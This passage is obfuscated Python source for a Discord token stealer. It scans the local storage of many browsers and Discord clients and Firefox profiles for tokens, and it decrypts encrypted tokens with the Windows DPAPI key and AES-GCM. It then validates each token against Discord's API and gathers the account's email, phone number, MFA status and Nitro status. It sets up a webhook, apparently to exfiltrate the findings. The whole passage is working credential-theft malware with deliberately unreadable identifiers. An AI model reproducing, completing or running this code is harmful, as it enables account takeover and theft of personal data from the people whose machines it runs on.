            'Kometa': MNDEZLQCEHIKTXCZDXYHMKOLONQDLBWVPBGMUECODPBXMIGIROGJOJTXJKCSIWKKVNTBFFAQZRYTPZFDPUEOTBESZBUYL + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': MNDEZLQCEHIKTXCZDXYHMKOLONQDLBWVPBGMUECODPBXMIGIROGJOJTXJKCSIWKKVNTBFFAQZRYTPZFDPUEOTBESZBUYL + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': MNDEZLQCEHIKTXCZDXYHMKOLONQDLBWVPBGMUECODPBXMIGIROGJOJTXJKCSIWKKVNTBFFAQZRYTPZFDPUEOTBESZBUYL + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': MNDEZLQCEHIKTXCZDXYHMKOLONQDLBWVPBGMUECODPBXMIGIROGJOJTXJKCSIWKKVNTBFFAQZRYTPZFDPUEOTBESZBUYL + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': MNDEZLQCEHIKTXCZDXYHMKOLONQDLBWVPBGMUECODPBXMIGIROGJOJTXJKCSIWKKVNTBFFAQZRYTPZFDPUEOTBESZBUYL + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': MNDEZLQCEHIKTXCZDXYHMKOLONQDLBWVPBGMUECODPBXMIGIROGJOJTXJKCSIWKKVNTBFFAQZRYTPZFDPUEOTBESZBUYL + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Google Chrome SxS': MNDEZLQCEHIKTXCZDXYHMKOLONQDLBWVPBGMUECODPBXMIGIROGJOJTXJKCSIWKKVNTBFFAQZRYTPZFDPUEOTBESZBUYL + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Google Chrome': MNDEZLQCEHIKTXCZDXYHMKOLONQDLBWVPBGMUECODPBXMIGIROGJOJTXJKCSIWKKVNTBFFAQZRYTPZFDPUEOTBESZBUYL + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Google Chrome1': MNDEZLQCEHIKTXCZDXYHMKOLONQDLBWVPBGMUECODPBXMIGIROGJOJTXJKCSIWKKVNTBFFAQZRYTPZFDPUEOTBESZBUYL + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Google Chrome2': MNDEZLQCEHIKTXCZDXYHMKOLONQDLBWVPBGMUECODPBXMIGIROGJOJTXJKCSIWKKVNTBFFAQZRYTPZFDPUEOTBESZBUYL + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Google Chrome3': MNDEZLQCEHIKTXCZDXYHMKOLONQDLBWVPBGMUECODPBXMIGIROGJOJTXJKCSIWKKVNTBFFAQZRYTPZFDPUEOTBESZBUYL + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Google Chrome4': MNDEZLQCEHIKTXCZDXYHMKOLONQDLBWVPBGMUECODPBXMIGIROGJOJTXJKCSIWKKVNTBFFAQZRYTPZFDPUEOTBESZBUYL + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Google Chrome5': MNDEZLQCEHIKTXCZDXYHMKOLONQDLBWVPBGMUECODPBXMIGIROGJOJTXJKCSIWKKVNTBFFAQZRYTPZFDPUEOTBESZBUYL + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': MNDEZLQCEHIKTXCZDXYHMKOLONQDLBWVPBGMUECODPBXMIGIROGJOJTXJKCSIWKKVNTBFFAQZRYTPZFDPUEOTBESZBUYL + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': MNDEZLQCEHIKTXCZDXYHMKOLONQDLBWVPBGMUECODPBXMIGIROGJOJTXJKCSIWKKVNTBFFAQZRYTPZFDPUEOTBESZBUYL + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': MNDEZLQCEHIKTXCZDXYHMKOLONQDLBWVPBGMUECODPBXMIGIROGJOJTXJKCSIWKKVNTBFFAQZRYTPZFDPUEOTBESZBUYL + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': MNDEZLQCEHIKTXCZDXYHMKOLONQDLBWVPBGMUECODPBXMIGIROGJOJTXJKCSIWKKVNTBFFAQZRYTPZFDPUEOTBESZBUYL + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': MNDEZLQCEHIKTXCZDXYHMKOLONQDLBWVPBGMUECODPBXMIGIROGJOJTXJKCSIWKKVNTBFFAQZRYTPZFDPUEOTBESZBUYL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': MNDEZLQCEHIKTXCZDXYHMKOLONQDLBWVPBGMUECODPBXMIGIROGJOJTXJKCSIWKKVNTBFFAQZRYTPZFDPUEOTBESZBUYL + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for EXGHRMLUQQZSSURRTUCPXSPCKGQFZGSCLHANUTCRANHQOCAHLWQREMWLPRILHZUJNHQCIVVZZOFGARZFPVL, VWEPPEFARLZNYGLSKXIZZLIISFSLAACGZZMPYHPCBETEOSPQORDVYIVKXZQUXJOFYVRHOSDLDRKBIHKIIUCEUFBD in YKCPUBYANFDCFMXICCQXENZLRRDLWPOAIKCGBAIRNYQOUBGSLXLXOJBJIASVIFOWZLEDTJGII.items():
            if not os.path.exists(VWEPPEFARLZNYGLSKXIZZLIISFSLAACGZZMPYHPCBETEOSPQORDVYIVKXZQUXJOFYVRHOSDLDRKBIHKIIUCEUFBD):
                continue
            SXTQMPMSAKHYLRLJDVPEOZZHHPJUSJZUGKLWPAZVMMAXUYMVVRINMBNDAFUDPUN = EXGHRMLUQQZSSURRTUCPXSPCKGQFZGSCLHANUTCRANHQOCAHLWQREMWLPRILHZUJNHQCIVVZZOFGARZFPVL.replace(" ", "").lower()
            if "cord" in VWEPPEFARLZNYGLSKXIZZLIISFSLAACGZZMPYHPCBETEOSPQORDVYIVKXZQUXJOFYVRHOSDLDRKBIHKIIUCEUFBD:
                if not os.path.exists(QXWJTXNXNIAETXDBNUPZIHNQZQMRNGIEGKFTUAPMXWIIHOWXTWTVLQWIOSOOIJDIXEQNEZMCGVNQUMLWFRM + f'\\{SXTQMPMSAKHYLRLJDVPEOZZHHPJUSJZUGKLWPAZVMMAXUYMVVRINMBNDAFUDPUN}\\Local State'):
                    continue
                for v4r_file_name in os.listdir(VWEPPEFARLZNYGLSKXIZZLIISFSLAACGZZMPYHPCBETEOSPQORDVYIVKXZQUXJOFYVRHOSDLDRKBIHKIIUCEUFBD):
                    if v4r_file_name[-3:] not in ["log", "ldb"]:
                        continue
                    with open(f'{VWEPPEFARLZNYGLSKXIZZLIISFSLAACGZZMPYHPCBETEOSPQORDVYIVKXZQUXJOFYVRHOSDLDRKBIHKIIUCEUFBD}\\{v4r_file_name}', errors='ignore') as v4r_file:
                        for v4r_line in v4r_file:
                            for y in re.findall(IVLJTTQSQEEWUZQFLELOAPMVOHPQLWODEWFMDSBJMUTCQOGEYZKYRSMDMS_enc, v4r_line.strip()):
                                GBXSTGWXYSRBPMMQFSCLYPXOGQQREPGHRZBGSUINUPQFRWXTARMCYAGZGBYQDHWBQCMNWKDUYKWQTHNAVNGABUXUYSTQV = MWFBHMGOZSBGUWZIYHPMGBYACLTIAGMHJMFVMHIXXSDKQNDJPXLJIVal(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), ZFPVMANUTMOYTDDVMJTKENPILZFXGYPKDUIKLABQIPKMNJWTPYAESWQLDXDYA(QXWJTXNXNIAETXDBNUPZIHNQZQMRNGIEGKFTUAPMXWIIHOWXTWTVLQWIOSOOIJDIXEQNEZMCGVNQUMLWFRM + f'\\{SXTQMPMSAKHYLRLJDVPEOZZHHPJUSJZUGKLWPAZVMMAXUYMVVRINMBNDAFUDPUN}\\Local State'))
                                if PRMKRGAKAUUASCGMAWJMHPTYTYSNSACXNJJDSKFQEMALSLNGKLXQMJRJMXRHKZSZYILWEYGVCCUSZDQCYZAZVAPLFL(GBXSTGWXYSRBPMMQFSCLYPXOGQQREPGHRZBGSUINUPQFRWXTARMCYAGZGBYQDHWBQCMNWKDUYKWQTHNAVNGABUXUYSTQV, UNYLQFDPSVZELCIWSPZZLIQCZUFDRMJGXMGLZADRRTSFEXOVUEDKTMOJMXDJDVOJPQASRSIYC):
                                    VPYCDLMKVHXJNZMRXVKMSWWWFBPPJJLRQKIRDIJHHHBHTCKWVZICYFPNCJUMAABAICXZDRQOEUUEKUTJWVIUZTXCXREA = requests.get(UNYLQFDPSVZELCIWSPZZLIQCZUFDRMJGXMGLZADRRTSFEXOVUEDKTMOJMXDJDVOJPQASRSIYC, headers={'Authorization': GBXSTGWXYSRBPMMQFSCLYPXOGQQREPGHRZBGSUINUPQFRWXTARMCYAGZGBYQDHWBQCMNWKDUYKWQTHNAVNGABUXUYSTQV}).json()['id']
                                    if VPYCDLMKVHXJNZMRXVKMSWWWFBPPJJLRQKIRDIJHHHBHTCKWVZICYFPNCJUMAABAICXZDRQOEUUEKUTJWVIUZTXCXREA not in IMAVOQZGNJDTGNOEBNZIANABHEDZPCCMQJCIBWVYBJVMHZCTCNVJCTCHNIHGBMZUJLUBNMUKGOEZPRRWRATNPQ:
                                        NCDQLCFMLMUUIVCXSQTSIJQDWMULQHNZAMPONUYLOEUKOWNQIQBMWFNAZDHKRBXAULWMQUQRAI.append(GBXSTGWXYSRBPMMQFSCLYPXOGQQREPGHRZBGSUINUPQFRWXTARMCYAGZGBYQDHWBQCMNWKDUYKWQTHNAVNGABUXUYSTQV)
                                        IMAVOQZGNJDTGNOEBNZIANABHEDZPCCMQJCIBWVYBJVMHZCTCNVJCTCHNIHGBMZUJLUBNMUKGOEZPRRWRATNPQ.append(VPYCDLMKVHXJNZMRXVKMSWWWFBPPJJLRQKIRDIJHHHBHTCKWVZICYFPNCJUMAABAICXZDRQOEUUEKUTJWVIUZTXCXREA)
                                        CLATUSVHYUXYBHCWLUKVCRQASYMIABFHNGRCIFAXRVVVTGRWJPUJX[GBXSTGWXYSRBPMMQFSCLYPXOGQQREPGHRZBGSUINUPQFRWXTARMCYAGZGBYQDHWBQCMNWKDUYKWQTHNAVNGABUXUYSTQV] = (EXGHRMLUQQZSSURRTUCPXSPCKGQFZGSCLHANUTCRANHQOCAHLWQREMWLPRILHZUJNHQCIVVZZOFGARZFPVL, f"{VWEPPEFARLZNYGLSKXIZZLIISFSLAACGZZMPYHPCBETEOSPQORDVYIVKXZQUXJOFYVRHOSDLDRKBIHKIIUCEUFBD}\\{v4r_file_name}")
            else:
                for v4r_file_name in os.listdir(VWEPPEFARLZNYGLSKXIZZLIISFSLAACGZZMPYHPCBETEOSPQORDVYIVKXZQUXJOFYVRHOSDLDRKBIHKIIUCEUFBD):
                    if v4r_file_name[-3:] not in ["log", "ldb"]:
                        continue
                    with open(f'{VWEPPEFARLZNYGLSKXIZZLIISFSLAACGZZMPYHPCBETEOSPQORDVYIVKXZQUXJOFYVRHOSDLDRKBIHKIIUCEUFBD}\\{v4r_file_name}', errors='ignore') as v4r_file:
                        for v4r_line in v4r_file:
                            for GBXSTGWXYSRBPMMQFSCLYPXOGQQREPGHRZBGSUINUPQFRWXTARMCYAGZGBYQDHWBQCMNWKDUYKWQTHNAVNGABUXUYSTQV in re.findall(IVLJTTQSQEEWUZQFLELOAPMVOHPQLWODEWFMDSBJMUTCQOGEYZKYRSMDMS, v4r_line.strip()):
                                if PRMKRGAKAUUASCGMAWJMHPTYTYSNSACXNJJDSKFQEMALSLNGKLXQMJRJMXRHKZSZYILWEYGVCCUSZDQCYZAZVAPLFL(GBXSTGWXYSRBPMMQFSCLYPXOGQQREPGHRZBGSUINUPQFRWXTARMCYAGZGBYQDHWBQCMNWKDUYKWQTHNAVNGABUXUYSTQV, UNYLQFDPSVZELCIWSPZZLIQCZUFDRMJGXMGLZADRRTSFEXOVUEDKTMOJMXDJDVOJPQASRSIYC):
                                    VPYCDLMKVHXJNZMRXVKMSWWWFBPPJJLRQKIRDIJHHHBHTCKWVZICYFPNCJUMAABAICXZDRQOEUUEKUTJWVIUZTXCXREA = requests.get(UNYLQFDPSVZELCIWSPZZLIQCZUFDRMJGXMGLZADRRTSFEXOVUEDKTMOJMXDJDVOJPQASRSIYC, headers={'Authorization': GBXSTGWXYSRBPMMQFSCLYPXOGQQREPGHRZBGSUINUPQFRWXTARMCYAGZGBYQDHWBQCMNWKDUYKWQTHNAVNGABUXUYSTQV}).json()['id']
                                    if VPYCDLMKVHXJNZMRXVKMSWWWFBPPJJLRQKIRDIJHHHBHTCKWVZICYFPNCJUMAABAICXZDRQOEUUEKUTJWVIUZTXCXREA not in IMAVOQZGNJDTGNOEBNZIANABHEDZPCCMQJCIBWVYBJVMHZCTCNVJCTCHNIHGBMZUJLUBNMUKGOEZPRRWRATNPQ:
                                        NCDQLCFMLMUUIVCXSQTSIJQDWMULQHNZAMPONUYLOEUKOWNQIQBMWFNAZDHKRBXAULWMQUQRAI.append(GBXSTGWXYSRBPMMQFSCLYPXOGQQREPGHRZBGSUINUPQFRWXTARMCYAGZGBYQDHWBQCMNWKDUYKWQTHNAVNGABUXUYSTQV)
                                        IMAVOQZGNJDTGNOEBNZIANABHEDZPCCMQJCIBWVYBJVMHZCTCNVJCTCHNIHGBMZUJLUBNMUKGOEZPRRWRATNPQ.append(VPYCDLMKVHXJNZMRXVKMSWWWFBPPJJLRQKIRDIJHHHBHTCKWVZICYFPNCJUMAABAICXZDRQOEUUEKUTJWVIUZTXCXREA)
                                        CLATUSVHYUXYBHCWLUKVCRQASYMIABFHNGRCIFAXRVVVTGRWJPUJX[GBXSTGWXYSRBPMMQFSCLYPXOGQQREPGHRZBGSUINUPQFRWXTARMCYAGZGBYQDHWBQCMNWKDUYKWQTHNAVNGABUXUYSTQV] = (EXGHRMLUQQZSSURRTUCPXSPCKGQFZGSCLHANUTCRANHQOCAHLWQREMWLPRILHZUJNHQCIVVZZOFGARZFPVL, f"{VWEPPEFARLZNYGLSKXIZZLIISFSLAACGZZMPYHPCBETEOSPQORDVYIVKXZQUXJOFYVRHOSDLDRKBIHKIIUCEUFBD}\\{v4r_file_name}")

        if os.path.exists(QXWJTXNXNIAETXDBNUPZIHNQZQMRNGIEGKFTUAPMXWIIHOWXTWTVLQWIOSOOIJDIXEQNEZMCGVNQUMLWFRM + "\\Mozilla\\Firefox\\Profiles"):
            for VWEPPEFARLZNYGLSKXIZZLIISFSLAACGZZMPYHPCBETEOSPQORDVYIVKXZQUXJOFYVRHOSDLDRKBIHKIIUCEUFBD, _, v4r_files in os.walk(QXWJTXNXNIAETXDBNUPZIHNQZQMRNGIEGKFTUAPMXWIIHOWXTWTVLQWIOSOOIJDIXEQNEZMCGVNQUMLWFRM + "\\Mozilla\\Firefox\\Profiles"):
                for v4r__file in v4r_files:
                    if v4r__file.endswith('.sqlite'):
                        with open(f'{VWEPPEFARLZNYGLSKXIZZLIISFSLAACGZZMPYHPCBETEOSPQORDVYIVKXZQUXJOFYVRHOSDLDRKBIHKIIUCEUFBD}\\{v4r__file}', errors='ignore') as v4r_file:
                            for v4r_line in v4r_file:
                                for GBXSTGWXYSRBPMMQFSCLYPXOGQQREPGHRZBGSUINUPQFRWXTARMCYAGZGBYQDHWBQCMNWKDUYKWQTHNAVNGABUXUYSTQV in re.findall(IVLJTTQSQEEWUZQFLELOAPMVOHPQLWODEWFMDSBJMUTCQOGEYZKYRSMDMS, v4r_line.strip()):
                                    if PRMKRGAKAUUASCGMAWJMHPTYTYSNSACXNJJDSKFQEMALSLNGKLXQMJRJMXRHKZSZYILWEYGVCCUSZDQCYZAZVAPLFL(GBXSTGWXYSRBPMMQFSCLYPXOGQQREPGHRZBGSUINUPQFRWXTARMCYAGZGBYQDHWBQCMNWKDUYKWQTHNAVNGABUXUYSTQV, UNYLQFDPSVZELCIWSPZZLIQCZUFDRMJGXMGLZADRRTSFEXOVUEDKTMOJMXDJDVOJPQASRSIYC):
                                        VPYCDLMKVHXJNZMRXVKMSWWWFBPPJJLRQKIRDIJHHHBHTCKWVZICYFPNCJUMAABAICXZDRQOEUUEKUTJWVIUZTXCXREA = requests.get(UNYLQFDPSVZELCIWSPZZLIQCZUFDRMJGXMGLZADRRTSFEXOVUEDKTMOJMXDJDVOJPQASRSIYC, headers={'Authorization': GBXSTGWXYSRBPMMQFSCLYPXOGQQREPGHRZBGSUINUPQFRWXTARMCYAGZGBYQDHWBQCMNWKDUYKWQTHNAVNGABUXUYSTQV}).json()['id']
                                        if VPYCDLMKVHXJNZMRXVKMSWWWFBPPJJLRQKIRDIJHHHBHTCKWVZICYFPNCJUMAABAICXZDRQOEUUEKUTJWVIUZTXCXREA not in IMAVOQZGNJDTGNOEBNZIANABHEDZPCCMQJCIBWVYBJVMHZCTCNVJCTCHNIHGBMZUJLUBNMUKGOEZPRRWRATNPQ:
                                            NCDQLCFMLMUUIVCXSQTSIJQDWMULQHNZAMPONUYLOEUKOWNQIQBMWFNAZDHKRBXAULWMQUQRAI.append(GBXSTGWXYSRBPMMQFSCLYPXOGQQREPGHRZBGSUINUPQFRWXTARMCYAGZGBYQDHWBQCMNWKDUYKWQTHNAVNGABUXUYSTQV)
                                            IMAVOQZGNJDTGNOEBNZIANABHEDZPCCMQJCIBWVYBJVMHZCTCNVJCTCHNIHGBMZUJLUBNMUKGOEZPRRWRATNPQ.append(VPYCDLMKVHXJNZMRXVKMSWWWFBPPJJLRQKIRDIJHHHBHTCKWVZICYFPNCJUMAABAICXZDRQOEUUEKUTJWVIUZTXCXREA)
                                            CLATUSVHYUXYBHCWLUKVCRQASYMIABFHNGRCIFAXRVVVTGRWJPUJX[GBXSTGWXYSRBPMMQFSCLYPXOGQQREPGHRZBGSUINUPQFRWXTARMCYAGZGBYQDHWBQCMNWKDUYKWQTHNAVNGABUXUYSTQV] = ('Firefox', f"{VWEPPEFARLZNYGLSKXIZZLIISFSLAACGZZMPYHPCBETEOSPQORDVYIVKXZQUXJOFYVRHOSDLDRKBIHKIIUCEUFBD}\\{v4r__file}")
        return NCDQLCFMLMUUIVCXSQTSIJQDWMULQHNZAMPONUYLOEUKOWNQIQBMWFNAZDHKRBXAULWMQUQRAI, CLATUSVHYUXYBHCWLUKVCRQASYMIABFHNGRCIFAXRVVVTGRWJPUJX

    def PRMKRGAKAUUASCGMAWJMHPTYTYSNSACXNJJDSKFQEMALSLNGKLXQMJRJMXRHKZSZYILWEYGVCCUSZDQCYZAZVAPLFL(GBXSTGWXYSRBPMMQFSCLYPXOGQQREPGHRZBGSUINUPQFRWXTARMCYAGZGBYQDHWBQCMNWKDUYKWQTHNAVNGABUXUYSTQV, UNYLQFDPSVZELCIWSPZZLIQCZUFDRMJGXMGLZADRRTSFEXOVUEDKTMOJMXDJDVOJPQASRSIYC):
        return requests.get(UNYLQFDPSVZELCIWSPZZLIQCZUFDRMJGXMGLZADRRTSFEXOVUEDKTMOJMXDJDVOJPQASRSIYC, headers={'Authorization': GBXSTGWXYSRBPMMQFSCLYPXOGQQREPGHRZBGSUINUPQFRWXTARMCYAGZGBYQDHWBQCMNWKDUYKWQTHNAVNGABUXUYSTQV}).status_code == 200

    def MWFBHMGOZSBGUWZIYHPMGBYACLTIAGMHJMFVMHIXXSDKQNDJPXLJIVal(BOPCKRXQPVTOHRVJDVKFZGZNKWAMNRTZWMQFSMHOGUKLPUGEQSJPJJDRQVTNOYFTBLVAJQBCSVTWHFAWQLLJWEDQNDOKES, DWVMAGDWHZZYZOYNGTXESWFQJRKPZBBHSUSQEJAVLVFCSQNOXLSZSVEUBROBDGD):
        SMFCAPGSGWUQAGUPMQCPYUSGZUBPKUDGUMWOHSNPHIQJKNHXBHNIGIUYOVYYZH = BOPCKRXQPVTOHRVJDVKFZGZNKWAMNRTZWMQFSMHOGUKLPUGEQSJPJJDRQVTNOYFTBLVAJQBCSVTWHFAWQLLJWEDQNDOKES[3:15]
        NMODAGUUVDVSEMCDHJNGQCMZNBRRQKIKDMHQKXSNCKMEMJACFBXQZEEKAEWO = BOPCKRXQPVTOHRVJDVKFZGZNKWAMNRTZWMQFSMHOGUKLPUGEQSJPJJDRQVTNOYFTBLVAJQBCSVTWHFAWQLLJWEDQNDOKES[15:]
        LUTPCACBDKBIJKUBRBLDBCALOENGZYSGGULXQVYMYDIJLGZJLYMCPBGJPJPKKRAZRFYJHSZCKHDTYVA = AES.new(DWVMAGDWHZZYZOYNGTXESWFQJRKPZBBHSUSQEJAVLVFCSQNOXLSZSVEUBROBDGD, AES.MODE_GCM, SMFCAPGSGWUQAGUPMQCPYUSGZUBPKUDGUMWOHSNPHIQJKNHXBHNIGIUYOVYYZH)
        return LUTPCACBDKBIJKUBRBLDBCALOENGZYSGGULXQVYMYDIJLGZJLYMCPBGJPJPKKRAZRFYJHSZCKHDTYVA.decrypt(NMODAGUUVDVSEMCDHJNGQCMZNBRRQKIKDMHQKXSNCKMEMJACFBXQZEEKAEWO)[:-16].decode()

    def ZFPVMANUTMOYTDDVMJTKENPILZFXGYPKDUIKLABQIPKMNJWTPYAESWQLDXDYA(VWEPPEFARLZNYGLSKXIZZLIISFSLAACGZZMPYHPCBETEOSPQORDVYIVKXZQUXJOFYVRHOSDLDRKBIHKIIUCEUFBD):
        if not os.path.exists(VWEPPEFARLZNYGLSKXIZZLIISFSLAACGZZMPYHPCBETEOSPQORDVYIVKXZQUXJOFYVRHOSDLDRKBIHKIIUCEUFBD):
            return None
        with open(VWEPPEFARLZNYGLSKXIZZLIISFSLAACGZZMPYHPCBETEOSPQORDVYIVKXZQUXJOFYVRHOSDLDRKBIHKIIUCEUFBD, "r", encoding="utf-8") as v4r_f:
            BYDOTCOTBGLOUWPGVLMKWSTQDXYOZEWYEXCMABNQUQPNBJLDYXRARUBHJAHKXPXTJHXWKTVIPYAGSEXBZOXMFHWITHVJEZFMYB = json.load(v4r_f)
        DWVMAGDWHZZYZOYNGTXESWFQJRKPZBBHSUSQEJAVLVFCSQNOXLSZSVEUBROBDGD = base64.b64decode(BYDOTCOTBGLOUWPGVLMKWSTQDXYOZEWYEXCMABNQUQPNBJLDYXRARUBHJAHKXPXTJHXWKTVIPYAGSEXBZOXMFHWITHVJEZFMYB["os_crypt"]["encrypted_key"])[5:]
        return CryptUnprotectData(DWVMAGDWHZZYZOYNGTXESWFQJRKPZBBHSUSQEJAVLVFCSQNOXLSZSVEUBROBDGD, None, None, None, 0)[1]

    NCDQLCFMLMUUIVCXSQTSIJQDWMULQHNZAMPONUYLOEUKOWNQIQBMWFNAZDHKRBXAULWMQUQRAI, CLATUSVHYUXYBHCWLUKVCRQASYMIABFHNGRCIFAXRVVVTGRWJPUJX = LCSWYHJTVSCTUCTLOBZOIBJRPMTGVCOCKXBRCWYGIUSYXLUAIYFQYU()
    OQVNJZGZEZGGYFVTIJBUPKNPLVEYQAUXNKDLUSMNVSEEKXEOCZSHNSAEER = SyncWebhook.from_url(TEHMBLJHQXYXUPCCHKGUDBCDWFKUIKCYCOMQFIVNEIBLJZWCQIYFBZ)

    if not NCDQLCFMLMUUIVCXSQTSIJQDWMULQHNZAMPONUYLOEUKOWNQIQBMWFNAZDHKRBXAULWMQUQRAI:
        JYLFFAWPSFKUCMZGZDMJIKLJPPXWGRLMRITBULMBHCPESHWOZCRMKXLPLLFWNZRAMJAEBLLHQA(
            TEHMBLJHQXYXUPCCHKGUDBCDWFKUIKCYCOMQFIVNEIBLJZWCQIYFBZ, 
            title=f'Discord Token {JVQTLDADTYXKYZHMXTKHPNYLFIGLMMMLYWLGZYSTPVADECBDSENXNOQZXQKIRPEMBYFMICHEXRUQRVVCYKIJKDAZ}:', 
            description=f"No discord tokens found."
        )
        return
    
    for GBXSTGWXYSRBPMMQFSCLYPXOGQQREPGHRZBGSUINUPQFRWXTARMCYAGZGBYQDHWBQCMNWKDUYKWQTHNAVNGABUXUYSTQV_d15c0rd in NCDQLCFMLMUUIVCXSQTSIJQDWMULQHNZAMPONUYLOEUKOWNQIQBMWFNAZDHKRBXAULWMQUQRAI:
        ZGZSDJERGIOFKCTOHUPGAHALCAVTGMPRQGDZZIHTAUTQYYOJDKQNQJIMUR = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': GBXSTGWXYSRBPMMQFSCLYPXOGQQREPGHRZBGSUINUPQFRWXTARMCYAGZGBYQDHWBQCMNWKDUYKWQTHNAVNGABUXUYSTQV_d15c0rd}).json()

        XUDVYNHBXKDXNOLEWFGEBHMIRHRCLHKSJTBEBWZTRKCMCWALOEENXXUQOWFZXHMPLROJREDEHSVTROI = ZGZSDJERGIOFKCTOHUPGAHALCAVTGMPRQGDZZIHTAUTQYYOJDKQNQJIMUR.get('username', "None") + '#' + ZGZSDJERGIOFKCTOHUPGAHALCAVTGMPRQGDZZIHTAUTQYYOJDKQNQJIMUR.get('discriminator', "None")
        PMURRCTNLMRFLSPVBNYBWDTNQRQZKREFKWQEDCKAYBEEYLNRPAJBYNVWHVXDVGEADEXPTSKHNKTQTEJTU = ZGZSDJERGIOFKCTOHUPGAHALCAVTGMPRQGDZZIHTAUTQYYOJDKQNQJIMUR.get('global_name', "None")
        MMYNSTEWFJIRGWKEOOWAYDONJORHOIOUCQFKFKOSDMEYPFGVOSRYYMATPILRLNPEMUFMQHDUGCLOHOAKJS = ZGZSDJERGIOFKCTOHUPGAHALCAVTGMPRQGDZZIHTAUTQYYOJDKQNQJIMUR.get('id', "None")
        VHBRPVQAEJTIKUAGVSJZEFUGNFTSQAFUDOCLEEOOBOSGEGPBWQDNDYMRJKCWDSKNCGYIQANJRWIQFOYCR = ZGZSDJERGIOFKCTOHUPGAHALCAVTGMPRQGDZZIHTAUTQYYOJDKQNQJIMUR.get('email', "None")
        ZRJPHJNRWHMQQEHLXYVFPAABUYPLTHMELQMAZMULCYUXZFZQKVXGYWXJWVAIGEQVEZAXNRXQHYGEFCNRXXTZE = ZGZSDJERGIOFKCTOHUPGAHALCAVTGMPRQGDZZIHTAUTQYYOJDKQNQJIMUR.get('verified', "None")
        NGXTPKLXSYACNXPVBKQBHDDLYSIELHWQGBYPVTAJUFCIQWSOHZRQIHAWFFRPWQOFVWWMMJNOTHPIONFBWVOTH = ZGZSDJERGIOFKCTOHUPGAHALCAVTGMPRQGDZZIHTAUTQYYOJDKQNQJIMUR.get('phone', "None")
        MMWPYMYPCEWCDEPUQWWOGEOCZTTAGGTPHRYGPGITUOIWEYFHZECTAYNQMXOVDVNSRUSMVMWNTORCNAAVEOAKRQVQVNSFOXTIT = ZGZSDJERGIOFKCTOHUPGAHALCAVTGMPRQGDZZIHTAUTQYYOJDKQNQJIMUR.get('locale', "None")
        QJMKZIQCAMUHMDKKLMSGQJJNRCDSWARDURVMBCBWAEYSSPWHJCDZPKVWSSPUIDOGMK = ZGZSDJERGIOFKCTOHUPGAHALCAVTGMPRQGDZZIHTAUTQYYOJDKQNQJIMUR.get('mfa_enabled', "None")

        try:
            if ZGZSDJERGIOFKCTOHUPGAHALCAVTGMPRQGDZZIHTAUTQYYOJDKQNQJIMUR.get('premium_type', 'None') == 0:
                HDYCHTYUIZGEZBDPKGSEKKNJWMFWKMPBNDJACGBRGYWNNHHVYGCOV = 'False'
            elif ZGZSDJERGIOFKCTOHUPGAHALCAVTGMPRQGDZZIHTAUTQYYOJDKQNQJIMUR.get('premium_type', 'None') == 1:
                HDYCHTYUIZGEZBDPKGSEKKNJWMFWKMPBNDJACGBRGYWNNHHVYGCOV = 'Nitro Classic'
            elif ZGZSDJERGIOFKCTOHUPGAHALCAVTGMPRQGDZZIHTAUTQYYOJDKQNQJIMUR.get('premium_type', 'None') == 2:
                HDYCHTYUIZGEZBDPKGSEKKNJWMFWKMPBNDJACGBRGYWNNHHVYGCOV = 'Nitro Boosts'
            elif ZGZSDJERGIOFKCTOHUPGAHALCAVTGMPRQGDZZIHTAUTQYYOJDKQNQJIMUR.get('premium_type', 'None') == 3:
                HDYCHTYUIZGEZBDPKGSEKKNJWMFWKMPBNDJACGBRGYWNNHHVYGCOV = 'Nitro Basic'
            else:
                HDYCHTYUIZGEZBDPKGSEKKNJWMFWKMPBNDJACGBRGYWNNHHVYGCOV = 'False'
        except:
            HDYCHTYUIZGEZBDPKGSEKKNJWMFWKMPBNDJACGBRGYWNNHHVYGCOV = "None"

        try: 
            YHEHRXZVXSQSIBPPPQYZTMFTYCAZGKVTECRMEAZUBUTUMLWKZQBLYDXNXYQA = f"https://cdn.discordapp.com/avatars/{MMYNSTEWFJIRGWKEOOWAYDONJORHOIOUCQFKFKOSDMEYPFGVOSRYYMATPILRLNPEMUFMQHDUGCLOHOAKJS}/{ZGZSDJERGIOFKCTOHUPGAHALCAVTGMPRQGDZZIHTAUTQYYOJDKQNQJIMUR['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{MMYNSTEWFJIRGWKEOOWAYDONJORHOIOUCQFKFKOSDMEYPFGVOSRYYMATPILRLNPEMUFMQHDUGCLOHOAKJS}/{ZGZSDJERGIOFKCTOHUPGAHALCAVTGMPRQGDZZIHTAUTQYYOJDKQNQJIMUR['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{MMYNSTEWFJIRGWKEOOWAYDONJORHOIOUCQFKFKOSDMEYPFGVOSRYYMATPILRLNPEMUFMQHDUGCLOHOAKJS}/{ZGZSDJERGIOFKCTOHUPGAHALCAVTGMPRQGDZZIHTAUTQYYOJDKQNQJIMUR['avatar']}.png"
        except: 
